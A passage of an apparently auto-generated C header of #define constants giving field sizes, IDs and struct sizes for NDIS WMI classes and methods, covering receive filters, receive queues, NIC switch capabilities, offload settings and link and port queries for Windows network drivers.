#define MSNdis_ReceiveFilterGlobalParameters_Flags_ID 2
#define MSNdis_ReceiveFilterGlobalParameters_EnabledFilterTypes_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterGlobalParameters_EnabledFilterTypes_ID 3
#define MSNdis_ReceiveFilterGlobalParameters_EnabledQueueTypes_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterGlobalParameters_EnabledQueueTypes_ID 4

#define MSNdis_ReceiveFilterGlobalParameters_SIZE (FIELD_OFFSET(MSNdis_ReceiveFilterGlobalParameters, EnabledQueueTypes) + MSNdis_ReceiveFilterGlobalParameters_EnabledQueueTypes_SIZE)

#define MSNdis_CountedString_Length_SIZE sizeof(USHORT)
#define MSNdis_CountedString_Length_ID 1
#define MSNdis_CountedString_String_SIZE sizeof(SHORT[257])
#define MSNdis_CountedString_String_ID 2

#define MSNdis_CountedString_SIZE (FIELD_OFFSET(MSNdis_CountedString, String) + MSNdis_CountedString_String_SIZE)

#define MSNdis_ReceiveFilterInfo_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveFilterInfo_Header_ID 1
#define MSNdis_ReceiveFilterInfo_Flags_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfo_Flags_ID 2
#define MSNdis_ReceiveFilterInfo_FilterType_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfo_FilterType_ID 3
#define MSNdis_ReceiveFilterInfo_FilterId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfo_FilterId_ID 4

#define MSNdis_ReceiveFilterInfo_SIZE (FIELD_OFFSET(MSNdis_ReceiveFilterInfo, FilterId) + MSNdis_ReceiveFilterInfo_FilterId_SIZE)

#define MSNdis_ReceiveFilterInfoArray_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveFilterInfoArray_Header_ID 1
#define MSNdis_ReceiveFilterInfoArray_QueueId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfoArray_QueueId_ID 2
#define MSNdis_ReceiveFilterInfoArray_FirstElementOffset_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfoArray_FirstElementOffset_ID 3
#define MSNdis_ReceiveFilterInfoArray_NumElements_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfoArray_NumElements_ID 4
#define MSNdis_ReceiveFilterInfoArray_ElementSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterInfoArray_ElementSize_ID 5
#define MSNdis_ReceiveFilterInfoArray_Filter_ID 6

#define MSNdis_ReceiveFilterFieldParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveFilterFieldParameters_Header_ID 1
#define MSNdis_ReceiveFilterFieldParameters_Flags_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterFieldParameters_Flags_ID 2
#define MSNdis_ReceiveFilterFieldParameters_FrameHeader_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterFieldParameters_FrameHeader_ID 3
#define MSNdis_ReceiveFilterFieldParameters_ReceiveFilterTest_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterFieldParameters_ReceiveFilterTest_ID 4
#define MSNdis_ReceiveFilterFieldParameters_MacHeaderField_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterFieldParameters_MacHeaderField_ID 5
#define MSNdis_ReceiveFilterFieldParameters_FieldByteArrayValue_SIZE sizeof(UCHAR[16])
#define MSNdis_ReceiveFilterFieldParameters_FieldByteArrayValue_ID 6
#define MSNdis_ReceiveFilterFieldParameters_ResultByteArrayValue_SIZE sizeof(UCHAR[16])
#define MSNdis_ReceiveFilterFieldParameters_ResultByteArrayValue_ID 7

#define MSNdis_ReceiveFilterFieldParameters_SIZE (FIELD_OFFSET(MSNdis_ReceiveFilterFieldParameters, ResultByteArrayValue) + MSNdis_ReceiveFilterFieldParameters_ResultByteArrayValue_SIZE)

#define MSNdis_ReceiveFilterParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveFilterParameters_Header_ID 1
#define MSNdis_ReceiveFilterParameters_Flags_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_Flags_ID 2
#define MSNdis_ReceiveFilterParameters_FilterType_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_FilterType_ID 3
#define MSNdis_ReceiveFilterParameters_QueueId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_QueueId_ID 4
#define MSNdis_ReceiveFilterParameters_FilterId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_FilterId_ID 5
#define MSNdis_ReceiveFilterParameters_FieldParametersArrayOffset_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_FieldParametersArrayOffset_ID 6
#define MSNdis_ReceiveFilterParameters_FieldParametersArrayNumElements_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_FieldParametersArrayNumElements_ID 7
#define MSNdis_ReceiveFilterParameters_FieldParametersArrayElementSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_FieldParametersArrayElementSize_ID 8
#define MSNdis_ReceiveFilterParameters_RequestedFilterIdBitCount_SIZE sizeof(ULONG)
#define MSNdis_ReceiveFilterParameters_RequestedFilterIdBitCount_ID 9
#define MSNdis_ReceiveFilterParameters_FieldParameters_ID 10

#define MSNdis_NicSwitchCapabilities_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_NicSwitchCapabilities_Header_ID 1
#define MSNdis_NicSwitchCapabilities_Flags_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_Flags_ID 2
#define MSNdis_NicSwitchCapabilities_NdisReserved1_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_NdisReserved1_ID 3
#define MSNdis_NicSwitchCapabilities_NumTotalMacAddresses_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_NumTotalMacAddresses_ID 4
#define MSNdis_NicSwitchCapabilities_NumMacAddressesPerPort_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_NumMacAddressesPerPort_ID 5
#define MSNdis_NicSwitchCapabilities_NumVlansPerPort_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_NumVlansPerPort_ID 6
#define MSNdis_NicSwitchCapabilities_NdisReserved2_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_NdisReserved2_ID 7
#define MSNdis_NicSwitchCapabilities_NdisReserved3_SIZE sizeof(ULONG)
#define MSNdis_NicSwitchCapabilities_NdisReserved3_ID 8

#define MSNdis_NicSwitchCapabilities_SIZE (FIELD_OFFSET(MSNdis_NicSwitchCapabilities, NdisReserved3) + MSNdis_NicSwitchCapabilities_NdisReserved3_SIZE)

#define MSNdis_GroupAffinity_Mask_SIZE sizeof(ULONGLONG)
#define MSNdis_GroupAffinity_Mask_ID 1
#define MSNdis_GroupAffinity_Group_SIZE sizeof(USHORT)
#define MSNdis_GroupAffinity_Group_ID 2
#define MSNdis_GroupAffinity_Reserved_SIZE sizeof(USHORT[3])
#define MSNdis_GroupAffinity_Reserved_ID 3

#define MSNdis_GroupAffinity_SIZE (FIELD_OFFSET(MSNdis_GroupAffinity, Reserved) + MSNdis_GroupAffinity_Reserved_SIZE)

#define MSNdis_ReceiveQueueParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveQueueParameters_Header_ID 1
#define MSNdis_ReceiveQueueParameters_Flags_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_Flags_ID 2
#define MSNdis_ReceiveQueueParameters_QueueType_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_QueueType_ID 3
#define MSNdis_ReceiveQueueParameters_QueueId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_QueueId_ID 4
#define MSNdis_ReceiveQueueParameters_QueueGroupId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_QueueGroupId_ID 5
#define MSNdis_ReceiveQueueParameters_ProcessorAffinity_SIZE sizeof(MSNdis_GroupAffinity)
#define MSNdis_ReceiveQueueParameters_ProcessorAffinity_ID 6
#define MSNdis_ReceiveQueueParameters_NumSuggestedReceiveBuffers_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_NumSuggestedReceiveBuffers_ID 7
#define MSNdis_ReceiveQueueParameters_MSIXTableEntry_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_MSIXTableEntry_ID 8
#define MSNdis_ReceiveQueueParameters_LookaheadSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueParameters_LookaheadSize_ID 9
#define MSNdis_ReceiveQueueParameters_VmName_SIZE sizeof(MSNdis_CountedString)
#define MSNdis_ReceiveQueueParameters_VmName_ID 10
#define MSNdis_ReceiveQueueParameters_QueueName_SIZE sizeof(MSNdis_CountedString)
#define MSNdis_ReceiveQueueParameters_QueueName_ID 11

#define MSNdis_ReceiveQueueParameters_SIZE (FIELD_OFFSET(MSNdis_ReceiveQueueParameters, QueueName) + MSNdis_ReceiveQueueParameters_QueueName_SIZE)

#define MSNdis_ReceiveQueueInfo_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveQueueInfo_Header_ID 1
#define MSNdis_ReceiveQueueInfo_Flags_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_Flags_ID 2
#define MSNdis_ReceiveQueueInfo_QueueType_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_QueueType_ID 3
#define MSNdis_ReceiveQueueInfo_QueueId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_QueueId_ID 4
#define MSNdis_ReceiveQueueInfo_QueueGroupId_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_QueueGroupId_ID 5
#define MSNdis_ReceiveQueueInfo_QueueState_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_QueueState_ID 6
#define MSNdis_ReceiveQueueInfo_ProcessorAffinity_SIZE sizeof(MSNdis_GroupAffinity)
#define MSNdis_ReceiveQueueInfo_ProcessorAffinity_ID 7
#define MSNdis_ReceiveQueueInfo_NumSuggestedReceiveBuffers_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_NumSuggestedReceiveBuffers_ID 8
#define MSNdis_ReceiveQueueInfo_MSIXTableEntry_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_MSIXTableEntry_ID 9
#define MSNdis_ReceiveQueueInfo_LookaheadSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfo_LookaheadSize_ID 10
#define MSNdis_ReceiveQueueInfo_VmName_SIZE sizeof(MSNdis_CountedString)
#define MSNdis_ReceiveQueueInfo_VmName_ID 11
#define MSNdis_ReceiveQueueInfo_QueueName_SIZE sizeof(MSNdis_CountedString)
#define MSNdis_ReceiveQueueInfo_QueueName_ID 12

#define MSNdis_ReceiveQueueInfo_SIZE (FIELD_OFFSET(MSNdis_ReceiveQueueInfo, QueueName) + MSNdis_ReceiveQueueInfo_QueueName_SIZE)

#define MSNdis_ReceiveQueueInfoArray_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_ReceiveQueueInfoArray_Header_ID 1
#define MSNdis_ReceiveQueueInfoArray_FirstElementOffset_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfoArray_FirstElementOffset_ID 2
#define MSNdis_ReceiveQueueInfoArray_NumElements_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfoArray_NumElements_ID 3
#define MSNdis_ReceiveQueueInfoArray_ElementSize_SIZE sizeof(ULONG)
#define MSNdis_ReceiveQueueInfoArray_ElementSize_ID 4
#define MSNdis_ReceiveQueueInfoArray_Queue_ID 5

#define WmiQueryLinkState     1

#define WmiQueryLinkState_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryLinkState_IN_Header_ID 1

#define WmiQueryLinkState_IN_SIZE (FIELD_OFFSET(WmiQueryLinkState_IN, Header) + WmiQueryLinkState_IN_Header_SIZE)

#define WmiQueryLinkState_OUT_LinkState_SIZE sizeof(MSNdis_LinkStateData)
#define WmiQueryLinkState_OUT_LinkState_ID 2

#define WmiQueryLinkState_OUT_SIZE (FIELD_OFFSET(WmiQueryLinkState_OUT, LinkState) + WmiQueryLinkState_OUT_LinkState_SIZE)

#define WmiQueryInterruptModeration     1

#define WmiQueryInterruptModeration_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryInterruptModeration_IN_Header_ID 1

#define WmiQueryInterruptModeration_IN_SIZE (FIELD_OFFSET(WmiQueryInterruptModeration_IN, Header) + WmiQueryInterruptModeration_IN_Header_SIZE)

#define WmiQueryInterruptModeration_OUT_InterruptModeration_SIZE sizeof(MSNdis_InterruptModerationParameters)
#define WmiQueryInterruptModeration_OUT_InterruptModeration_ID 2

#define WmiQueryInterruptModeration_OUT_SIZE (FIELD_OFFSET(WmiQueryInterruptModeration_OUT, InterruptModeration) + WmiQueryInterruptModeration_OUT_InterruptModeration_SIZE)

#define WmiSetInterruptModeration     1

#define WmiSetInterruptModeration_IN_MethodHeader_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiSetInterruptModeration_IN_MethodHeader_ID 1
#define WmiSetInterruptModeration_IN_InterruptModeration_SIZE sizeof(MSNdis_InterruptModerationParameters)
#define WmiSetInterruptModeration_IN_InterruptModeration_ID 2

#define WmiSetInterruptModeration_IN_SIZE (FIELD_OFFSET(WmiSetInterruptModeration_IN, InterruptModeration) + WmiSetInterruptModeration_IN_InterruptModeration_SIZE)

#define WmiSetInterruptModeration_OUT_OutputInfo_SIZE sizeof(MSNdis_WmiOutputInfo)
#define WmiSetInterruptModeration_OUT_OutputInfo_ID 3

#define WmiSetInterruptModeration_OUT_SIZE (FIELD_OFFSET(WmiSetInterruptModeration_OUT, OutputInfo) + WmiSetInterruptModeration_OUT_OutputInfo_SIZE)

#define WmiSetLinkParameters     1

#define WmiSetLinkParameters_IN_MethodHeader_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiSetLinkParameters_IN_MethodHeader_ID 1
#define WmiSetLinkParameters_IN_LinkParameters_SIZE sizeof(MSNdis_LinkParameters)
#define WmiSetLinkParameters_IN_LinkParameters_ID 2

#define WmiSetLinkParameters_IN_SIZE (FIELD_OFFSET(WmiSetLinkParameters_IN, LinkParameters) + WmiSetLinkParameters_IN_LinkParameters_SIZE)

#define WmiSetLinkParameters_OUT_OutputInfo_SIZE sizeof(MSNdis_WmiOutputInfo)
#define WmiSetLinkParameters_OUT_OutputInfo_ID 3

#define WmiSetLinkParameters_OUT_SIZE (FIELD_OFFSET(WmiSetLinkParameters_OUT, OutputInfo) + WmiSetLinkParameters_OUT_OutputInfo_SIZE)

#define WmiQueryStatisticsInfo     1

#define WmiQueryStatisticsInfo_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryStatisticsInfo_IN_Header_ID 1

#define WmiQueryStatisticsInfo_IN_SIZE (FIELD_OFFSET(WmiQueryStatisticsInfo_IN, Header) + WmiQueryStatisticsInfo_IN_Header_SIZE)

#define WmiQueryStatisticsInfo_OUT_StatisticsInfo_SIZE sizeof(MSNdis_StatisticsInfo)
#define WmiQueryStatisticsInfo_OUT_StatisticsInfo_ID 2

#define WmiQueryStatisticsInfo_OUT_SIZE (FIELD_OFFSET(WmiQueryStatisticsInfo_OUT, StatisticsInfo) + WmiQueryStatisticsInfo_OUT_StatisticsInfo_SIZE)

#define WmiQueryPortState     1

#define WmiQueryPortState_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryPortState_IN_Header_ID 1

#define WmiQueryPortState_IN_SIZE (FIELD_OFFSET(WmiQueryPortState_IN, Header) + WmiQueryPortState_IN_Header_SIZE)

#define WmiQueryPortState_OUT_PortState_SIZE sizeof(MSNdis_PortStateData)
#define WmiQueryPortState_OUT_PortState_ID 2

#define WmiQueryPortState_OUT_SIZE (FIELD_OFFSET(WmiQueryPortState_OUT, PortState) + WmiQueryPortState_OUT_PortState_SIZE)

#define WmiEnumeratePorts     1

#define WmiEnumeratePorts_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiEnumeratePorts_IN_Header_ID 1

#define WmiEnumeratePorts_IN_SIZE (FIELD_OFFSET(WmiEnumeratePorts_IN, Header) + WmiEnumeratePorts_IN_Header_SIZE)

#define WmiEnumeratePorts_OUT_Ports_SIZE sizeof(MSNdis_PortArray)
#define WmiEnumeratePorts_OUT_Ports_ID 2

#define WmiEnumeratePorts_OUT_SIZE (FIELD_OFFSET(WmiEnumeratePorts_OUT, Ports) + WmiEnumeratePorts_OUT_Ports_SIZE)

#define WmiSetPortParameters     1

#define WmiSetPortParameters_IN_MethodHeader_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiSetPortParameters_IN_MethodHeader_ID 1
#define WmiSetPortParameters_IN_PortParameters_SIZE sizeof(MSNdis_PortAuthParameters)
#define WmiSetPortParameters_IN_PortParameters_ID 2

#define WmiSetPortParameters_IN_SIZE (FIELD_OFFSET(WmiSetPortParameters_IN, PortParameters) + WmiSetPortParameters_IN_PortParameters_SIZE)

#define WmiSetPortParameters_OUT_OutputInfo_SIZE sizeof(MSNdis_WmiOutputInfo)
#define WmiSetPortParameters_OUT_OutputInfo_ID 3

#define WmiSetPortParameters_OUT_SIZE (FIELD_OFFSET(WmiSetPortParameters_OUT, OutputInfo) + WmiSetPortParameters_OUT_OutputInfo_SIZE)

#define WmiQueryPciDeviceCustomProperty     1

#define WmiQueryPciDeviceCustomProperty_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryPciDeviceCustomProperty_IN_Header_ID 1

#define WmiQueryPciDeviceCustomProperty_IN_SIZE (FIELD_OFFSET(WmiQueryPciDeviceCustomProperty_IN, Header) + WmiQueryPciDeviceCustomProperty_IN_Header_SIZE)

#define WmiQueryPciDeviceCustomProperty_OUT_PciDeviceProperty_SIZE sizeof(MSNdis_PciDeviceProperty)
#define WmiQueryPciDeviceCustomProperty_OUT_PciDeviceProperty_ID 2

#define WmiQueryPciDeviceCustomProperty_OUT_SIZE (FIELD_OFFSET(WmiQueryPciDeviceCustomProperty_OUT, PciDeviceProperty) + WmiQueryPciDeviceCustomProperty_OUT_PciDeviceProperty_SIZE)

#define MSNdis_EnumerateAdapterEx_EnumerateAdapter_SIZE sizeof(MSNdis_WmiEnumAdapter)
#define MSNdis_EnumerateAdapterEx_EnumerateAdapter_ID 1

#define MSNdis_EnumerateAdapterEx_SIZE (FIELD_OFFSET(MSNdis_EnumerateAdapterEx, EnumerateAdapter) + MSNdis_EnumerateAdapterEx_EnumerateAdapter_SIZE)

#define WmiQueryCurrentOffloadConfig     1

#define WmiQueryCurrentOffloadConfig_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryCurrentOffloadConfig_IN_Header_ID 1

#define WmiQueryCurrentOffloadConfig_IN_SIZE (FIELD_OFFSET(WmiQueryCurrentOffloadConfig_IN, Header) + WmiQueryCurrentOffloadConfig_IN_Header_SIZE)

#define WmiQueryCurrentOffloadConfig_OUT_Offload_SIZE sizeof(MSNdis_WmiOffload)
#define WmiQueryCurrentOffloadConfig_OUT_Offload_ID 2

#define WmiQueryCurrentOffloadConfig_OUT_SIZE (FIELD_OFFSET(WmiQueryCurrentOffloadConfig_OUT, Offload) + WmiQueryCurrentOffloadConfig_OUT_Offload_SIZE)

#define WmiQueryHardwareOffloadConfig     1

#define WmiQueryHardwareOffloadConfig_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryHardwareOffloadConfig_IN_Header_ID 1

#define WmiQueryHardwareOffloadConfig_IN_SIZE (FIELD_OFFSET(WmiQueryHardwareOffloadConfig_IN, Header) + WmiQueryHardwareOffloadConfig_IN_Header_SIZE)

#define WmiQueryHardwareOffloadConfig_OUT_Offload_SIZE sizeof(MSNdis_WmiOffload)
#define WmiQueryHardwareOffloadConfig_OUT_Offload_ID 2

#define WmiQueryHardwareOffloadConfig_OUT_SIZE (FIELD_OFFSET(WmiQueryHardwareOffloadConfig_OUT, Offload) + WmiQueryHardwareOffloadConfig_OUT_Offload_SIZE)

#define WmiSetTcpOffloadParameters     1

#define WmiSetTcpOffloadParameters_IN_MethodHeader_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiSetTcpOffloadParameters_IN_MethodHeader_ID 1
#define WmiSetTcpOffloadParameters_IN_TcpOffloadParameters_SIZE sizeof(MSNdis_TcpOffloadParameters)
#define WmiSetTcpOffloadParameters_IN_TcpOffloadParameters_ID 2

#define WmiSetTcpOffloadParameters_IN_SIZE (FIELD_OFFSET(WmiSetTcpOffloadParameters_IN, TcpOffloadParameters) + WmiSetTcpOffloadParameters_IN_TcpOffloadParameters_SIZE)

#define WmiSetTcpOffloadParameters_OUT_OutputInfo_SIZE sizeof(MSNdis_WmiOutputInfo)
#define WmiSetTcpOffloadParameters_OUT_OutputInfo_ID 3

#define WmiSetTcpOffloadParameters_OUT_SIZE (FIELD_OFFSET(WmiSetTcpOffloadParameters_OUT, OutputInfo) + WmiSetTcpOffloadParameters_OUT_OutputInfo_SIZE)

#define WmiQueryTcpConnectionOffloadCurrentConfig     1

#define WmiQueryTcpConnectionOffloadCurrentConfig_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryTcpConnectionOffloadCurrentConfig_IN_Header_ID 1

#define WmiQueryTcpConnectionOffloadCurrentConfig_IN_SIZE (FIELD_OFFSET(WmiQueryTcpConnectionOffloadCurrentConfig_IN, Header) + WmiQueryTcpConnectionOffloadCurrentConfig_IN_Header_SIZE)

#define WmiQueryTcpConnectionOffloadCurrentConfig_OUT_Offload_SIZE sizeof(MSNdis_WmiTcpConnectionOffload)
#define WmiQueryTcpConnectionOffloadCurrentConfig_OUT_Offload_ID 2

#define WmiQueryTcpConnectionOffloadCurrentConfig_OUT_SIZE (FIELD_OFFSET(WmiQueryTcpConnectionOffloadCurrentConfig_OUT, Offload) + WmiQueryTcpConnectionOffloadCurrentConfig_OUT_Offload_SIZE)

#define WmiQueryTcpConnectionOffloadHardwareConfig     1

#define WmiQueryTcpConnectionOffloadHardwareConfig_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryTcpConnectionOffloadHardwareConfig_IN_Header_ID 1

#define WmiQueryTcpConnectionOffloadHardwareConfig_IN_SIZE (FIELD_OFFSET(WmiQueryTcpConnectionOffloadHardwareConfig_IN, Header) + WmiQueryTcpConnectionOffloadHardwareConfig_IN_Header_SIZE)

#define WmiQueryTcpConnectionOffloadHardwareConfig_OUT_Offload_SIZE sizeof(MSNdis_WmiTcpConnectionOffload)
#define WmiQueryTcpConnectionOffloadHardwareConfig_OUT_Offload_ID 2

#define WmiQueryTcpConnectionOffloadHardwareConfig_OUT_SIZE (FIELD_OFFSET(WmiQueryTcpConnectionOffloadHardwareConfig_OUT, Offload) + WmiQueryTcpConnectionOffloadHardwareConfig_OUT_Offload_SIZE)

#define WmiQueryReceiveScaleCapabilities     1

#define WmiQueryReceiveScaleCapabilities_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryReceiveScaleCapabilities_IN_Header_ID 1

#define WmiQueryReceiveScaleCapabilities_IN_SIZE (FIELD_OFFSET(WmiQueryReceiveScaleCapabilities_IN, Header) + WmiQueryReceiveScaleCapabilities_IN_Header_SIZE)

#define WmiQueryReceiveScaleCapabilities_OUT_RssCaps_SIZE sizeof(MSNdis_WmiReceiveScaleCapabilities)
#define WmiQueryReceiveScaleCapabilities_OUT_RssCaps_ID 2

#define WmiQueryReceiveScaleCapabilities_OUT_SIZE (FIELD_OFFSET(WmiQueryReceiveScaleCapabilities_OUT, RssCaps) + WmiQueryReceiveScaleCapabilities_OUT_RssCaps_SIZE)

#define WmiQueryHDSplitCurrentConfig     1

#define WmiQueryHDSplitCurrentConfig_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryHDSplitCurrentConfig_IN_Header_ID 1

#define WmiQueryHDSplitCurrentConfig_IN_SIZE (FIELD_OFFSET(WmiQueryHDSplitCurrentConfig_IN, Header) + WmiQueryHDSplitCurrentConfig_IN_Header_SIZE)

#define WmiQueryHDSplitCurrentConfig_OUT_HdSplitCurrentConfig_SIZE sizeof(MSNdis_WmiHDSplitCurrentConfig)
#define WmiQueryHDSplitCurrentConfig_OUT_HdSplitCurrentConfig_ID 2

#define WmiQueryHDSplitCurrentConfig_OUT_SIZE (FIELD_OFFSET(WmiQueryHDSplitCurrentConfig_OUT, HdSplitCurrentConfig) + WmiQueryHDSplitCurrentConfig_OUT_HdSplitCurrentConfig_SIZE)

#define WmiSetHDSplitParameters     1

#define WmiSetHDSplitParameters_IN_MethodHeader_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiSetHDSplitParameters_IN_MethodHeader_ID 1
#define WmiSetHDSplitParameters_IN_HDSplitParameters_SIZE sizeof(MSNdis_HDSplitParameters)
#define WmiSetHDSplitParameters_IN_HDSplitParameters_ID 2

#define WmiSetHDSplitParameters_IN_SIZE (FIELD_OFFSET(WmiSetHDSplitParameters_IN, HDSplitParameters) + WmiSetHDSplitParameters_IN_HDSplitParameters_SIZE)

#define WmiSetHDSplitParameters_OUT_OutputInfo_SIZE sizeof(MSNdis_WmiOutputInfo)
#define WmiSetHDSplitParameters_OUT_OutputInfo_ID 3

#define WmiSetHDSplitParameters_OUT_SIZE (FIELD_OFFSET(WmiSetHDSplitParameters_OUT, OutputInfo) + WmiSetHDSplitParameters_OUT_OutputInfo_SIZE)

#define WmiQueryPhysicalMediumTypeEx     1

#define WmiQueryPhysicalMediumTypeEx_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryPhysicalMediumTypeEx_IN_Header_ID 1

#define WmiQueryPhysicalMediumTypeEx_IN_SIZE (FIELD_OFFSET(WmiQueryPhysicalMediumTypeEx_IN, Header) + WmiQueryPhysicalMediumTypeEx_IN_Header_SIZE)

#define WmiQueryPhysicalMediumTypeEx_OUT_NdisPhysicalMediumTypeEx_SIZE sizeof(ULONG)
#define WmiQueryPhysicalMediumTypeEx_OUT_NdisPhysicalMediumTypeEx_ID 2

#define WmiQueryPhysicalMediumTypeEx_OUT_SIZE (FIELD_OFFSET(WmiQueryPhysicalMediumTypeEx_OUT, NdisPhysicalMediumTypeEx) + WmiQueryPhysicalMediumTypeEx_OUT_NdisPhysicalMediumTypeEx_SIZE)

#define WmiQueryReceiveFilterHardwareCapabilities     1

#define WmiQueryReceiveFilterHardwareCapabilities_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryReceiveFilterHardwareCapabilities_IN_Header_ID 1

#define WmiQueryReceiveFilterHardwareCapabilities_IN_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterHardwareCapabilities_IN, Header) + WmiQueryReceiveFilterHardwareCapabilities_IN_Header_SIZE)

#define WmiQueryReceiveFilterHardwareCapabilities_OUT_ReceiveFilterHardwareCapabilities_SIZE sizeof(MSNdis_ReceiveFilterCapabilities)
#define WmiQueryReceiveFilterHardwareCapabilities_OUT_ReceiveFilterHardwareCapabilities_ID 2

#define WmiQueryReceiveFilterHardwareCapabilities_OUT_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterHardwareCapabilities_OUT, ReceiveFilterHardwareCapabilities) + WmiQueryReceiveFilterHardwareCapabilities_OUT_ReceiveFilterHardwareCapabilities_SIZE)

#define WmiQueryReceiveFilterGlobalParameters     1

#define WmiQueryReceiveFilterGlobalParameters_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiQueryReceiveFilterGlobalParameters_IN_Header_ID 1

#define WmiQueryReceiveFilterGlobalParameters_IN_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterGlobalParameters_IN, Header) + WmiQueryReceiveFilterGlobalParameters_IN_Header_SIZE)

#define WmiQueryReceiveFilterGlobalParameters_OUT_ReceiveFilterGlobalParameters_SIZE sizeof(MSNdis_ReceiveFilterGlobalParameters)
#define WmiQueryReceiveFilterGlobalParameters_OUT_ReceiveFilterGlobalParameters_ID 2

#define WmiQueryReceiveFilterGlobalParameters_OUT_SIZE (FIELD_OFFSET(WmiQueryReceiveFilterGlobalParameters_OUT, ReceiveFilterGlobalParameters) + WmiQueryReceiveFilterGlobalParameters_OUT_ReceiveFilterGlobalParameters_SIZE)

#define WmiEnumReceiveFilters     1

#define WmiEnumReceiveFilters_IN_Header_SIZE sizeof(MSNdis_WmiMethodHeader)
#define WmiEnumReceiveFilters_IN_Header_ID 1
#define WmiEnumReceiveFilters_IN_ReceiveFilterInfoArray_SIZE sizeof(MSNdis_ReceiveFilterInfoArray)
#define WmiEnumReceiveFilters_IN_ReceiveFilterInfoArray_ID 2

#define WmiEnumReceiveFilters_IN_SIZE (FIELD_OFFSET(WmiEnumReceiveFilters_IN, ReceiveFilterInfoArray) + WmiEnumReceiveFilters_IN_ReceiveFilterInfoArray_SIZE)

#define WmiEnumReceiveFilters_OUT_ReceiveFilterInfoArray_SIZE sizeof(MSNdis_ReceiveFilterInfoArray)
#define WmiEnumReceiveFilters_OUT_ReceiveFilterInfoArray_ID 2

#define WmiEnumReceiveFilters_OUT_SIZE (FIELD_OFFSET(WmiEnumReceiveFilters_OUT, ReceiveFilterInfoArray) + WmiEnumReceiveFilters_OUT_ReceiveFilterInfoArray_SIZE)

#define WmiQueryReceiveFilterParameters     1

